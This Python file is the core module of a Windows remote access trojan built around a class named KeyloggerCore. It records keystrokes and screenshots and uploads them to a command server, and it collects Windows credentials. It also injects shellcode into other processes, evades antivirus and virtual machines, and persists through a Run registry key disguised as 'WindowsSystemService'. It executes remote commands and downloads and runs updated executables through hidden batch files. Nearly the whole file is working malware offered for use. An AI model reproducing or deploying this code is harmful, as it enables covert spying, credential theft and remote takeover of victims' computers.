import threading
import time
import json
import logging
import sys
import platform
import subprocess
import requests
import winreg
from datetime import datetime
from rat_config import Config
from encryption.manager import EncryptionManager, EncryptionError
from network.communicator import ServerCommunicator, CommunicationError
from system.collector import SystemCollector
from commands.handler import CommandHandler, CommandError
from monitoring.logger import ActivityLogger
from system.process_injector import ProcessInjector
from packaging import version
from PIL import Image
import io
import pyautogui
import os
import base64
from system.vm_detector import VMDetector
from monitoring.rdp_controller import RDPController
from system.anti_av import AntiAV
from system.file_manager import FileManager
from urllib.parse import urljoin, urlparse, urlunparse

# Configure logging always at INFO, DEBUG if enabled
logging.basicConfig(
    level=logging.DEBUG if Config.DEBUG_MODE else logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(Config.ERROR_LOG_FILE),
        logging.StreamHandler()
    ]
)

class KeyloggerCore:
    def __init__(self):
        try:
            logging.debug("KeyloggerCore initialization started")
            
            # Validate configuration
            Config.validate_config()
            
            # Get behavior configuration from Config
            self.behavior = Config.get_behavior_config()
            
            # Initialize core components
            self.client_id = Config.get_client_id()
            self.encryption = EncryptionManager(Config.ENCRYPTION_KEY)
            self.communicator = ServerCommunicator(self.client_id, self.encryption)
            self.running = True

            # Initialize optional components based on feature toggles
            self._initialize_optional_components()
            
            # Run startup procedures based on enabled features
            self._run_startup_procedures()

            logging.info("KeyloggerCore initialized successfully")

        except Exception as e:
            logging.error(f"Initialization error: {str(e)}")
            self.emergency_stop()

    def _initialize_optional_components(self):
        """Initialize optional components based on feature toggles"""
        
        # Keylogging
        if self.behavior["keylogging_enabled"]:
            self.logger = ActivityLogger(Config.KEYLOGGING_BUFFER_SIZE)
            logging.info("Keylogger initialized")
        
        # RDP Control
        if self.behavior["rdp_enabled"]:
            self.rdp_controller = RDPController(self.encryption)
            logging.info("RDP Controller initialized")
        
        # File Management
        if self.behavior["file_management_enabled"]:
            self.file_manager = FileManager(self.encryption, self.communicator)
            logging.info("File Manager initialized")
        
        # Antivirus Detection
        if self.behavior["antivirus_detection_enabled"]:
            self.anti_av = AntiAV()
            logging.info("AntiAV initialized")
            
            # Adjust behavior based on antivirus if enabled
            if self.behavior["antivirus_behavior_adjustment"]:
                self._adjust_behavior_based_on_antivirus()

    def _adjust_behavior_based_on_antivirus(self):
        """Adjust behavior based on detected antivirus"""
        try:
            if not self.behavior["antivirus_detection_enabled"]:
                return
                
            antiviruses = self.anti_av.detect_antivirus()
            for av in antiviruses:
                behavior_adjustment = self.anti_av.adjust_behavior(av)
                # Update behavior based on antivirus detection
                self.behavior.update(behavior_adjustment)
                logging.info(f"Adjusted behavior for {av['name']}: {behavior_adjustment}")
                
                # Report to server
                self.communicator.upload_antivirus_status({
                    "antivirus": av,
                    "behavior": self.behavior,
                    "client_id": self.client_id,
                    "timestamp": datetime.now().isoformat()
                })
        except Exception as e:
            logging.error(f"Antivirus behavior adjustment error: {str(e)}")

    def _run_startup_procedures(self):
        """Run startup procedures based on enabled features"""
        
        if Config.TEST_MODE:
            logging.info("Test mode - skipping startup procedures")
            return
        
        if self.behavior["windows_credentials_enabled"]:
            self._collect_initial_credentials()

        # Process Injection
        if (self.behavior["process_injection_enabled"] and 
            platform.system().lower() == "windows" and 
            not Config.DEBUG_MODE):
            self._attempt_process_injection()

        # Auto Update
        if self.behavior["auto_update_enabled"]:
            self._check_for_updates()

        # VM Detection
        if self.behavior["vm_detection_enabled"]:
            self._check_vm_environment()

        # Persistence
        if self.behavior["persistence_enabled"]:
            self._add_to_startup()

    def _collect_initial_credentials(self):
        """جمع‌آوری credential ها در اولین اجرا"""
        try:
            logging.info("Collecting initial Windows credentials...")
            from system.collector import SystemCollector
            collector = SystemCollector()
            credentials = collector.collect_windows_credentials()

            logging.info(f"Initial credential collection completed: {len(credentials.get('credentials', []))} entries")

        except Exception as e:
            logging.error(f"Initial credential collection failed: {str(e)}")

    def _attempt_process_injection(self):
        """Attempt process injection if enabled"""
        try:
            injector = ProcessInjector()
            pid = injector.find_target_process(Config.INJECTION_TARGET_PROCESS)
            if pid:
                shellcode = injector.prepare_shellcode()
                if shellcode and injector.inject_code(pid, shellcode):
                    logging.info("Process injection successful. Exiting current process.")
                    sys.exit(0)
                else:
                    logging.warning("Process injection failed. Continuing normal execution.")
            else:
                logging.warning("No target process found for injection.")
        except Exception as e:
            logging.error(f"Process injection error: {str(e)}")

    def _check_for_updates(self):
        """Check for updates if auto-update is enabled"""
        try:
            logging.info("Checking for updates...")
            response = self.communicator.check_version()
            
            if 'error' in response:
                logging.error(f"Version check error: {response['error']}")
                return

            server_version = response.get('current_version', '0.0')
            download_url = response.get('download_url', '')

            logging.info(f"Current version: {Config.CLIENT_VERSION}, Server version: {server_version}")

            if version.parse(server_version) > version.parse(Config.CLIENT_VERSION):
                logging.info(f"New version {server_version} available. Downloading from {download_url}")
                self._update_client(download_url, server_version)
            else:
                logging.info("Client is up-to-date.")
        except Exception as e:
            logging.error(f"Update check error: {str(e)}")

    def _update_client(self, download_url, new_version):
        """Update client to new version"""
        try:
            # Normalize URL to avoid double slashes and ensure proper scheme
            parsed_url = urlparse(download_url)
            clean_url = urlunparse((
                parsed_url.scheme or 'https',  # Default to https if scheme missing
                parsed_url.netloc,
                '/'.join(filter(None, parsed_url.path.split('/'))),  # Remove empty path segments
                parsed_url.params,
                parsed_url.query,
                parsed_url.fragment
            ))

            logging.info(f"Downloading update from cleaned URL: {clean_url}")
            response = requests.get(
                clean_url,
                timeout=30,
                verify=False,
                proxies=self.communicator.proxies
            )
            response.raise_for_status()
            logging.info("Download successful")

            new_exe_path = f"version_{new_version.replace('.', '_')}.exe"
            with open(new_exe_path, 'wb') as f:
                f.write(response.content)
            logging.info(f"Downloaded new version to {new_exe_path}")

            current_exe = os.path.abspath(sys.executable if getattr(sys, 'frozen', False) else __file__)
            batch_file = "update.bat"

            batch_content = f"""
@echo off
ping 127.0.0.1 -n 2 > nul
del /F /Q "{current_exe}"
move /Y "{new_exe_path}" "{current_exe}"
start "" "{current_exe}"
del /F /Q %~f0
"""
            with open(batch_file, 'w', encoding='utf-8') as f:
                f.write(batch_content)

            subprocess.Popen(batch_file, shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
            logging.info(f"Created and executed update batch file: {batch_file}")

            sys.exit(0)

        except requests.HTTPError as e:
            if e.response.status_code == 404:
                logging.warning(f"Update file not found at {clean_url}, skipping update.")
            else:
                logging.error(f"Update download error: {str(e)}")
        except Exception as e:
            logging.error(f"Update error: {str(e)}")

    def _check_vm_environment(self):
        """Check VM environment if VM detection is enabled"""
        try:
            vm_details = VMDetector.get_vm_details()
            logging.info(f"VM Detection Details: {vm_details}")
            
            # Report to server
            self.communicator.upload_vm_status(vm_details)
            
            # Self-destruct if VM detected and enabled
            if (self.behavior["vm_self_destruct"] and 
                vm_details['is_vm'] and 
                not Config.DEBUG_MODE):
                logging.warning("Virtual Machine detected. Initiating self-destruct.")
                self.self_destruct()
            elif Config.DEBUG_MODE and vm_details['is_vm']:
                logging.warning("Virtual Machine detected, but self-destruct skipped in debug mode.")
                
        except Exception as e:
            logging.error(f"VM detection error: {str(e)}")

    def self_destruct(self):
        """Self-destruct the client"""
        try:
            logging.info("Starting self-destruct sequence...")
            try:
                self.communicator.report_self_destruct()
                logging.info("Self-destruct report sent to server")
            except Exception as e:
                logging.error(f"Failed to send self-destruct report: {str(e)}")
            
            if not Config.TEST_MODE:
                self._remove_from_startup()
                self._cleanup_files()
                self._delete_executable()
                logging.info("Self-destruct complete. Terminating process.")
                sys.exit(0)
        except Exception as e:
            logging.error(f"Self-destruct error: {str(e)}")
            sys.exit(1)

    def _remove_from_startup(self):
        """Remove from Windows startup"""
        if platform.system().lower() != "windows":
            logging.info("Startup removal only supported on Windows")
            return
        try:
            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            app_name = "WindowsSystemService"
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_WRITE) as reg_key:
                winreg.DeleteValue(reg_key, app_name)
            logging.info("Removed from startup registry")
        except FileNotFoundError:
            logging.info("Startup registry entry not found")
        except Exception as e:
            logging.error(f"Failed to remove startup entry: {str(e)}")

    def _cleanup_files(self):
        """Cleanup temporary files"""
        try:
            temp_files = [
                "keylogger.log",
                "screenshot.png",
                "errors.log"
            ]
            for temp_file in temp_files:
                if os.path.exists(temp_file):
                    os.remove(temp_file)
                    logging.info(f"Deleted temporary file: {temp_file}")
        except Exception as e:
            logging.error(f"Failed to cleanup files: {str(e)}")

    def _delete_executable(self):
        """Delete the executable file"""
        if platform.system().lower() != "windows":
            logging.info("Executable deletion only supported on Windows")
            return
        try:
            exe_path = os.path.abspath(sys.executable if getattr(sys, 'frozen', False) else __file__)
            batch_file = "self_destruct.bat"
            batch_content = f"""
@echo off
ping 127.0.0.1 -n 2 > nul
del /F /Q "{exe_path}"
del /F /Q %~f0
"""
            with open(batch_file, 'w', encoding='utf-8') as f:
                f.write(batch_content)
            subprocess.Popen(batch_file, shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
            logging.info(f"Created and executed self-destruct batch file: {batch_file}")
        except Exception as e:
            logging.error(f"Failed to delete executable: {str(e)}")

    def _add_to_startup(self):
        """Add to Windows startup"""
        if platform.system().lower() != "windows":
            logging.info("Startup persistence only supported on Windows")
            return
        try:
            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            app_name = "WindowsSystemService"
            exe_path = os.path.abspath(sys.executable if getattr(sys, 'frozen', False) else __file__)
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_WRITE) as reg_key:
                winreg.SetValueEx(reg_key, app_name, 0, winreg.REG_SZ, exe_path)
            logging.info("Added to startup registry")
        except Exception as e:
            logging.error(f"Failed to add to startup: {str(e)}")

    def emergency_stop(self):
        """Emergency stop procedure"""
        self.running = False
        logging.info("Emergency stop activated")
        if Config.SELF_DESTRUCT_ON_ERROR and not Config.TEST_MODE:
            self.self_destruct()
        else:
            logging.warning("Error occurred, but self-destruct disabled or in test mode.")

    def start(self):
        """Start the keylogger core with enabled features"""
        try:
            logging.info("Starting keylogger core with enabled features...")
            
            # Start keylogging if enabled
            if self.behavior["keylogging_enabled"]:
                from pynput.keyboard import Listener
                self.keyboard_listener = Listener(on_press=self.logger.log_keystroke)
                self.keyboard_listener.start()
                logging.info("Keylogging enabled")
            
            # Set emergency hotkey if persistence enabled
            if self.behavior["persistence_enabled"]:
                from keyboard import add_hotkey
                add_hotkey(Config.EMERGENCY_HOTKEY, self.emergency_stop)
                logging.info(f"Emergency hotkey set: {Config.EMERGENCY_HOTKEY}")

            # Collect system info if enabled
            if self.behavior["system_info_enabled"]:
                system_info = SystemCollector().collect_system_info()
                logging.info(f"Collected system info")

            # Start command listener if enabled
            if self.behavior["command_handler_enabled"]:
                threading.Thread(target=self._command_listener, daemon=True).start()
                logging.info("Command listener started")

            # Start log upload if keylogging enabled
            if self.behavior["keylogging_enabled"]:
                threading.Thread(target=self._upload_logs, daemon=True).start()
                logging.info("Log upload started")

            # Start screenshot monitor if enabled
            if self.behavior["screenshot_enabled"]:
                threading.Thread(target=self._screenshot_monitor, daemon=True).start()
                logging.info("Screenshot monitor started")

            # Start RDP if enabled
            if self.behavior["rdp_enabled"]:
                try:
                    self.rdp_controller.start()
                    logging.info("RDP controller started")
                except Exception as e:
                    logging.error(f"Failed to start RDP: {str(e)}")

            logging.info("Keylogger core started successfully with enabled features")
            
            # Main loop
            while self.running:
                time.sleep(1)

        except Exception as e:
            logging.error(f"Start error: {str(e)}")
            self.emergency_stop()

    def stop(self):
        """Stop the keylogger gracefully"""
        self.running = False
        if hasattr(self, 'keyboard_listener'):
            self.keyboard_listener.stop()
        logging.info("Keylogger stopped")

    def _command_listener(self):
        """Listen for commands from server with error handling"""
        try:
            while self.running:
                try:
                    commands = self.communicator.fetch_commands()
                    for cmd in commands:
                        logging.info(f"Received command: {cmd}")
                        command_type = cmd.get('type')
                        params = cmd.get('params', {})  # پیش‌فرض dictionary خالی
    
                        # اگر params لیست هست، به dictionary تبدیل کن
                        if isinstance(params, list):
                            if params and isinstance(params[0], dict):
                                params = params[0]
                            else:
                                params = {}
    
                        try:
                            result = CommandHandler.execute(command_type, params)
    
                            # همیشه نتیجه را به سرور ارسال کن، حتی اگر خطا داشته باشد
                            self.communicator.send_command_result(cmd['id'], result)
    
                            # اگر خطا وجود دارد، لاگ کن اما ادامه بده
                            if isinstance(result, dict) and result.get('status') == 'error':
                                logging.warning(f"Command {command_type} executed with error: {result.get('message')}")
                                continue
                            
                        except CommandError as e:
                            # خطای خاص command handler
                            error_result = {
                                "status": "error",
                                "message": f"Command handler error: {str(e)}",
                                "command_type": command_type,
                                "timestamp": datetime.datetime.now().isoformat()
                            }
                            self.communicator.send_command_result(cmd['id'], error_result)
                            logging.error(f"Command handler error for {command_type}: {str(e)}")
                            continue
                        
                        except Exception as e:
                            # خطای غیرمنتظره
                            error_result = {
                                "status": "error", 
                                "message": f"Unexpected error: {str(e)}",
                                "command_type": command_type,
                                "timestamp": datetime.datetime.now().isoformat()
                            }
                            self.communicator.send_command_result(cmd['id'], error_result)
                            logging.error(f"Unexpected error in command {command_type}: {str(e)}")
                            continue
                        
                except CommunicationError as e:
                    logging.error(f"Command listener communication error: {str(e)}")
                except Exception as e:
                    logging.error(f"Command listener general error: {str(e)}")
    
                time.sleep(Config.COMMAND_POLL_INTERVAL)
        except Exception as e:
            logging.error(f"Command listener critical error: {str(e)}")

    def _upload_logs(self):
        """Upload logs to server"""
        while self.running:
            try:
                if hasattr(self, 'logger'):
                    logs = self.logger.get_logs()
                    if logs:
                        logging.info(f"Uploading {len(logs)} logs")
                        self.communicator.upload_data(logs, {})
                        self.logger.clear_logs()
            except Exception as e:
                logging.error(f"Log upload error: {str(e)}")
            time.sleep(Config.CHECK_INTERVAL)

    def _screenshot_monitor(self):
        """Take and upload screenshots"""
        while self.running:
            try:
                if self.behavior["screenshot_enabled"]:
                    screenshot = pyautogui.screenshot()
                    img_byte_arr = io.BytesIO()
                    
                    # Use quality setting from config
                    quality = Config.SCREENSHOT_QUALITY
                    screenshot.save(img_byte_arr, format='PNG', optimize=True, quality=quality)
                    
                    screenshot_data = img_byte_arr.getvalue()
                    encrypted_data = self.encryption.encrypt(base64.b64encode(screenshot_data).decode('utf-8'))
                    
                    logging.info("Captured and encrypted screenshot")
                    self.communicator.upload_data([], {}, screenshot_data)
            except Exception as e:
                logging.error(f"Screenshot monitor error: {str(e)}")
            time.sleep(Config.SCREENSHOT_INTERVAL)

if __name__ == "__main__":
    if Config.TEST_MODE:
        print("Test mode enabled: Skipping actual execution.")
        print(f"Enabled features: {Config.get_behavior_config()}")
    else:
        keylogger = KeyloggerCore()
        try:
            keylogger.start()
        except KeyboardInterrupt:
            logging.info("Keyboard interrupt received. Stopping keylogger...")
            keylogger.stop()
        except Exception as e:
            logging.error(f"Unexpected error: {str(e)}")
            keylogger.emergency_stop()